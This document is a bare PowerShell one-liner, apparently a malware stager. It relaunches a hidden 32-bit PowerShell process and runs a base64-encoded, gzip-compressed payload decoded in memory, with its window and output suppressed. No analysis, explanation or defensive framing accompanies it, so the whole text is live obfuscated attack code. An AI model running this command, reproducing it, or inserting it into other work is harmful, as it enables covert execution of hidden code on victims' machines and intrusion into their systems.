if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((''H4sIAKq1LmICA7VWbW/aSBD+Xqn/waqQMCrBBtyXRKp0a4OBJBATAgQoqjb2Ym9Ye4m9QEiv//1mjZ3Qa3KXO6mWSPZlZnb2mWdmdrGOXEF5pLjflO9v3yjZ5+AYh4pawB/KSsEbeqWnrcIqNHhT+aKoM7RaNXiIaTQ/ObHWcUwisZ9XWkSgJCHhDaMkUUvKn8o4IDE5uri5Ja5QviuFb5UW4zeYZWI7C7sBUY5Q5Mm9c+5i6VZlsGJUqMWvX4ul2VF1XmnerTFL1OJglwgSVjzGiiXlR0keeLVbEbXYpW7ME74QlTGN6rXKMErwgvTA2oZ0iQi4lxThNk/3iYlYx1F2LWlnL6UWYejE3EWeF5MkKZaVmTxhNp//oc6y4y/XkaAhqXQiQWK+GpB4Q12SVNo48hi5JIs5aA1ETCN/XiqB2IYviVqI1oyVlf9iRu2RbQ7ea5XUQyWQckRcKkNMn7tol3trRvaqxWc8BSKU4MvIAPj9kBAucvL42439DH2eFvJvlu4Q8Fh1eEJT5S+KXla6cDQWPN7BtHAVr0lp/oi3Urg9My6W5deaq+a6oBk0cP8K1mYjTr35k4WfKFC4n6AHKfQyoRtkQSPS2EU4pG7OWfW5sJAFIykqlVysBy6qxWyDeA3CiI+FxFmy4xe1ZkjFo665pswjMXIhtAl4BVEv/ezMPnRqsRN1SQgA7udA18ICMoXk0ll27PLT5RyEihbDSVJWnDWkqltWBgQz4pUVFCU020JrwdNh8cnd7poJ6uJE5Obmpb/BmR1r8SgR8dqF0AIEV4MVcSlmEpGy0qYeMXcD6ufHF5/Fw8KMQQKBpQ3EA1YkDgMhCRODp3tylCoDIjrhipEQhNLaYTPsQ6XI8iSlGPaJV3zB0zwb9tSX0OSYHPgJ8R4wLsrKiMYCKpGEOaXY//Pj1yqUOmTFJIuQmqfazNwJmQuFqH4pmZrBlIISCwDEjnlo4oR8NPb1Rn2nXVAHwTfpRKzrnS5ptbOFXxd+Q1rv8MYn7+z0tq11XStxWvZnRLf+1v3cQ6536pHjAcj1R4awHNTuU900AtfUr9KxP6FV30derx+4THeay3vNSHS6bY+7bsN82NYS4KthtK91VK8bF3V9CQBKnSXohHR7fw5jKKwX52YnMfUOa55alzfjmj0ds7Zm2MFizJPBx0lD07RjDze6O4RM7tW7u+vqJb9qu6FpRFw7towlaiJkRc2RbfKziRkjRxthf8XDwIoGLd9CyFlTMu0PbbPft000bN3eNY41XzseX+PAHI9qdLq6vgxgbm/b/TNNNzoeeeDTLQDX4gj7lyDjWzU3WIBM4z0y3/d4UsNLkyMTZOzpHWoFk5XtMNi/GtY4GrHeNUbn052tadWJY6C2zsctH/VBHPtmH6Nk03hoaNWRx73xh95koY2u2SetYfWd4FreWVuF8u+23Thzp9Wte/Hp8/mYjkKOhpo2egecmA1pJOq1eYFKNuhv3xTwPTngxUvNoYvjJMAM+AJFP89dm8d2VskdTqWGqsJzYEniiDBoodBkc74jxrgru0ha8aGD7fuKbHPDTurRc6OS8ihYemou+dLJyRR8hAQCalfOSeSLoKzf13Ud2oJ+rxtpnrz+YhZf7VRpqyz7isQlM81S02CNLhRV/d1IwdNBQAF7GauXYIOTl1BuoADuC4AEz+ScHUK3v9UjCQ6AA8SqcO2ZfDQAOUD7iNwpBSE76mGHLqyax5vT38mYrIgF8M/7N8Y8rf3D7qtYpJdTbH5Z/XnhoAX8tvuPMRUgN4BazMj+jfA8DFmOHEQ3jQ3kwCL75Pv5Yi2OevAaS/vBXw0dd8K2CwAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);